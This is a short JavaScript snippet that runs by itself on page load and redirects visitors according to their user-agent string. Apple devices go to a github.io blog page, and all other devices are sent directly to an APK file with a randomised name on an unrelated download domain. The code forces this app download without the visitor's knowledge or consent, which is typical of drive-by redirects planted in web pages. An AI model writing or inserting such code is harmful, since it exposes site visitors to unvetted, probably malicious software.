function browserRedirect() 
{
            var sUserAgent = navigator.userAgent.toLowerCase();
            var trident = sUserAgent.match("trident") == "trident";
            var bIsLinux = sUserAgent.match("linux") == "linux";
            var bIsAndroid = sUserAgent.match("android") == "android";
            var bIsIphone = sUserAgent.match("iphone") == "iphone";
            var bIsIPad = sUserAgent.match("ipad") == "ipad";
            var bIsMac = sUserAgent.match("mac") == "mac";         
            {
               if(bIsIphone||bIsIPad||bIsMac)
	       {
                 window.location.href ="https://tiebaqq.github.io/blog/index2.html";
               }
              else
            {
               window.location.href ="https://appcdn.yiwen213.com/sl/kbplay02417-sdgrsdrgd.apk";
            }

            }
}
browserRedirect();